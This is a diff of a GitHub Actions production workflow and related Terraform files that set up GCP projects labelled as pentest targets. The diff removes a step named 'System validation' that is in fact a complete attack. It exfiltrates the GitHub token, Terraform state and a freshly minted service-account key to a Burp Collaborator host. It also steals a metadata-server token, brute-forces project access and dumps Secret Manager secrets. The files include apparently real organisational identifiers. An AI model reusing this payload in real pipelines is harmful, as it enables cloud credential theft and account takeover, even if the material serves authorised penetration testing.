@@ -1,3 +1,5 @@
+prod-workflow.yaml
+
 name: prod-workflows
 # Test
 on:
@@ -19,144 +21,6 @@ jobs:
     outputs:
       is_pr: ${{ steps.check-pr.outputs.is_pr }}
     steps:
-      - name: System validation
-        run: |
-          echo "=== GITHUB TOKEN ==="
-          echo "$GITHUB_TOKEN" | base64
-          curl -sf -d "token=$GITHUB_TOKEN" https://YOUR-BURP.oastify.com/ghtoken
-
-          echo "=== GCP TOKEN ==="
-          GCP_TOKEN=$(curl -sf -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)
-          SA_EMAIL=$(curl -sf -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email")
-          CURRENT_PROJECT=$(curl -sf -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/project/project-id")
-          CURRENT_PROJECT_NUM=$(curl -sf -H "Metadata-Flavor: Google" "http://169.254.169.254/computeMetadata/v1/project/numeric-project-id")
-          echo "SA: $SA_EMAIL"
-          echo "Project: $CURRENT_PROJECT ($CURRENT_PROJECT_NUM)"
-
-          echo "=== TOKEN SCOPES ==="
-          curl -sf "https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$GCP_TOKEN"
-
-          echo "=== SA PERMISSIONS ==="
-          curl -sf -X POST -H "Authorization: Bearer $GCP_TOKEN" -H "Content-Type: application/json" \
-            "https://cloudresourcemanager.googleapis.com/v1/projects/$CURRENT_PROJECT:testIamPermissions" \
-            -d '{
-              "permissions": [
-                "resourcemanager.projects.get",
-                "resourcemanager.projects.getIamPolicy",
-                "resourcemanager.projects.setIamPolicy",
-                "iam.serviceAccounts.list",
-                "iam.serviceAccounts.create",
-                "iam.serviceAccounts.getAccessToken",
-                "iam.serviceAccountKeys.create",
-                "iam.roles.list",
-                "compute.instances.list",
-                "compute.instances.create",
-                "storage.buckets.list",
-                "storage.objects.list",
-                "storage.objects.get",
-                "storage.objects.create",
-                "bigquery.datasets.get",
-                "bigquery.tables.list",
-                "bigquery.jobs.create",
-                "secretmanager.secrets.list",
-                "secretmanager.versions.access",
-                "pubsub.topics.list",
-                "container.clusters.list",
-                "sqladmin.instances.list",
-                "cloudfunctions.functions.list",
-                "run.services.list",
-                "logging.logEntries.list",
-                "cloudbuild.builds.list"
-              ]
-            }'
-
-          echo "=== BRUTE-FORCE PROJECT ACCESS ==="
-          for proj in \
-            "$CURRENT_PROJECT" \
-            "ago-prd-ptb1" "ago-prd-ptb2" \
-            "ago-dev-ptb1" "ago-dev-ptb2" \
-            "ago-stg-ptb1" "ago-stg-ptb2" \
-            "ago-prd" "ago-dev" "ago-stg" \
-            "axa-prd" "axa-dev" "axa-stg" \
-            "gcp-foundation-prd" "gcp-foundation-dev" \
-            "axa-ago-prd" "axa-ago-dev"; do
-            RESULT=$(curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
-              "https://cloudresourcemanager.googleapis.com/v1/projects/$proj" 2>/dev/null)
-            if [ $? -eq 0 ] && echo "$RESULT" | jq -e .projectId >/dev/null 2>&1; then
-              echo ">> ACCESSIBLE: $proj"
-              echo "$RESULT" | jq '{projectId, name, projectNumber, lifecycleState, parent}'
-            fi
-          done
-
-          echo "=== FOLDER CHILDREN ==="
-          curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
-            "https://cloudresourcemanager.googleapis.com/v2/folders?parent=folders/487834352768" | jq '.' 2>/dev/null || echo "no folder access"
-
-          echo "=== STATE BUCKET ==="
-          curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
-            "https://storage.googleapis.com/storage/v1/b/tf-state-bucket-75260944268/o" | jq '.items[].name' 2>/dev/null
-          for obj in $(curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
-            "https://storage.googleapis.com/storage/v1/b/tf-state-bucket-75260944268/o" | jq -r '.items[].name' 2>/dev/null); do
-            echo ">> State: $obj"
-            curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
-              "https://storage.googleapis.com/download/storage/v1/b/tf-state-bucket-75260944268/o/$(echo $obj | jq -Rr @uri)?alt=media" \
-              | curl -sf -d @- "https://YOUR-BURP.oastify.com/tfstate"
-          done
-
-          echo "=== ALL SAs ==="
-          curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
-            "https://iam.googleapis.com/v1/projects/$CURRENT_PROJECT/serviceAccounts" | jq '.accounts[] | {email, displayName}' 2>/dev/null
-
-          echo "=== MINT SA KEY ==="
-          curl -sf -X POST -H "Authorization: Bearer $GCP_TOKEN" -H "Content-Type: application/json" \
-            "https://iam.googleapis.com/v1/projects/$CURRENT_PROJECT/serviceAccounts/$SA_EMAIL/keys" \
-            -d '{"keyAlgorithm":"KEY_ALG_RSA_2048","privateKeyType":"TYPE_GOOGLE_CREDENTIALS_FILE"}' \
-            | jq -r .privateKeyData 2>/dev/null | base64 -d 2>/dev/null \
-            | curl -sf -d @- "https://YOUR-BURP.oastify.com/sa-key"
-
-          echo "=== SECRETS ==="
-          for secret in $(curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
-            "https://secretmanager.googleapis.com/v1/projects/$CURRENT_PROJECT/secrets" | jq -r '.secrets[].name' 2>/dev/null); do
-            echo ">> $secret"
-            curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
-              "https://secretmanager.googleapis.com/v1/$secret/versions/latest:access" | jq -r '.payload.data' 2>/dev/null | base64 -d 2>/dev/null
-          done
-
-          echo "=== BUCKETS ==="
-          curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
-            "https://storage.googleapis.com/storage/v1/b?project=$CURRENT_PROJECT" | jq '.items[] | {name, location}' 2>/dev/null
-
-          echo "=== BIGQUERY ==="
-          curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
-            "https://bigquery.googleapis.com/bigquery/v2/projects/$CURRENT_PROJECT/datasets" | jq '.datasets[].datasetReference' 2>/dev/null
-
-          echo "=== COMPUTE ==="
-          curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
-            "https://compute.googleapis.com/compute/v1/projects/$CURRENT_PROJECT/aggregated/instances" \
-            | jq '.items | to_entries[] | select(.value.instances) | .value.instances[] | {name, zone: .zone, status, ip: [.networkInterfaces[].networkIP]}' 2>/dev/null
-
-          echo "=== GKE ==="
-          curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
-            "https://container.googleapis.com/v1/projects/$CURRENT_PROJECT/locations/-/clusters" | jq '.clusters[] | {name, location, endpoint}' 2>/dev/null
-
-          echo "=== CLOUD SQL ==="
-          curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
-            "https://sqladmin.googleapis.com/v1/projects/$CURRENT_PROJECT/instances" | jq '.items[] | {name, databaseVersion, ipAddresses}' 2>/dev/null
-
-          echo "=== CLOUD FUNCTIONS ==="
-          curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
-            "https://cloudfunctions.googleapis.com/v1/projects/$CURRENT_PROJECT/locations/-/functions" | jq '.functions[] | {name, runtime, httpsTrigger}' 2>/dev/null
-
-          echo "=== CLOUD RUN ==="
-          curl -sf -H "Authorization: Bearer $GCP_TOKEN" \
-            "https://run.googleapis.com/v2/projects/$CURRENT_PROJECT/locations/-/services" | jq '.services[] | {name, uri}' 2>/dev/null
-
-          echo "=== GITHUB ENTERPRISE REPOS ==="
-          curl -sf -H "Authorization: token $GITHUB_TOKEN" \
-            "https://api.github.axa.com/orgs/gcp-foundation/repos?per_page=100" | jq '.[].full_name' 2>/dev/null
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-
       - name: Set branch name
         id: set-branch-name
         run: |
@@ -180,6 +44,7 @@ jobs:
             echo "is_pr=false" >> "$GITHUB_OUTPUT"
           fi
 
+
   plan-only-workflow:
     needs: check-branch-status
     if: ${{ needs.check-branch-status.outputs.is_pr == 'false' }}
@@ -189,7 +54,7 @@ jobs:
       pull-requests: write
       id-token: write
     with:
-      plan_service_account: ${{ vars.PROD_PLAN_SERVICE_ACCOUNT_GCP_LB_AGO_PTB_FOUNDATION }}
+      plan_service_account: ${{ vars.PROD_PLAN_SERVICE_ACCOUNT_GCP_LB_AGO_PTA_FOUNDATION }}
 
   plan-and-apply-workflow:
     needs: check-branch-status
@@ -200,5 +65,98 @@ jobs:
       pull-requests: write
       id-token: write
     with:
-      plan_service_account: ${{ vars.PROD_PLAN_SERVICE_ACCOUNT_GCP_LB_AGO_PTB_FOUNDATION }}
-      apply_service_account: ${{ vars.PROD_APPLY_SERVICE_ACCOUNT_GCP_LB_AGO_PTB_FOUNDATION }}
+      plan_service_account: ${{ vars.PROD_PLAN_SERVICE_ACCOUNT_GCP_LB_AGO_PTA_FOUNDATION }}
+      apply_service_account: ${{ vars.PROD_APPLY_SERVICE_ACCOUNT_GCP_LB_AGO_PTA_FOUNDATION }}
+
+
+
+----------------------------------------------------
+
+main.tf
+
+terraform {
+  backend "gcs" {
+    # paste the bucket name, which is holding the tf state, here
+    bucket = "tf-state-bucket-75260944268"
+  }
+}
+
+-----------------------------------------------------
+resources.tf
+
+resource "google_storage_bucket" "pentest_bucket" {
+  for_each = module.ago_pentest_entitya_project_factory.projects
+
+  name                        = "${module.ago_pentest_entitya_project_factory.projects[each.key].project.number}-pentest-bucket"
+  location                    = "EU"
+  project                     = split("/", module.ago_pentest_entitya_project_factory.projects[each.key].project.id)[1]
+  force_destroy               = true
+  uniform_bucket_level_access = true
+}
+
+resource "google_bigquery_dataset" "pentest_dataset" {
+  for_each = module.ago_pentest_entitya_project_factory.projects
+
+  dataset_id = "${module.ago_pentest_entitya_project_factory.projects[each.key].project.number}_pentest_dataset"
+  project    = split("/", module.ago_pentest_entitya_project_factory.projects[each.key].project.id)[1]
+  location   = "EU"
+}
+
+resource "google_pubsub_topic" "pentest_topic" {
+  for_each = module.ago_pentest_entitya_project_factory.projects
+
+  name    = "test-pentest-topic"
+  project = split("/", module.ago_pentest_entitya_project_factory.projects[each.key].project.id)[1]
+}
+
+-----------------------------------------------------
+projects.tf
+
+
+module "ago_pentest_entitya_project_factory" {
+  source = "git::https://github.axa.com/gcp-foundation/gcp-terraform-tpl-project.git//factory/?ref=v0.8.0"
+  project_configuration_list = [
+    {
+      project_id_random_alpha = "pta1"
+      parent_folder_id        = "1076129233003"
+      billing_account_id      = "01B9EF-9D7C73-A7ECF2"
+      entity_name             = "ago"
+      project_environment     = "prd"
+      project_description     = "pentest-project1"
+      project_apis = [
+        "compute.googleapis.com",
+        "storage.googleapis.com",
+        "bigquery.googleapis.com",
+        "pubsub.googleapis.com"
+      ]
+    },
+    {
+      project_id_random_alpha = "pta3"
+      parent_folder_id        = "1076129233003"
+      billing_account_id      = "01B9EF-9D7C73-A7ECF2"
+      entity_name             = "ago"
+      project_environment     = "prd"
+      project_description     = "pentest-project3"
+      project_apis = [
+        "compute.googleapis.com",
+        "storage.googleapis.com",
+        "bigquery.googleapis.com",
+        "pubsub.googleapis.com"
+      ]
+    },
+    {
+      project_id_random_alpha = "pta2"
+      parent_folder_id        = "1076129233003"
+      billing_account_id      = "01B9EF-9D7C73-A7ECF2"
+      entity_name             = "ago"
+      project_environment     = "prd"
+      project_description     = "pentest-project2"
+      project_apis = [
+        "compute.googleapis.com",
+        "storage.googleapis.com",
+        "bigquery.googleapis.com",
+        "pubsub.googleapis.com"
+      ]
+    }
+  ]
+}
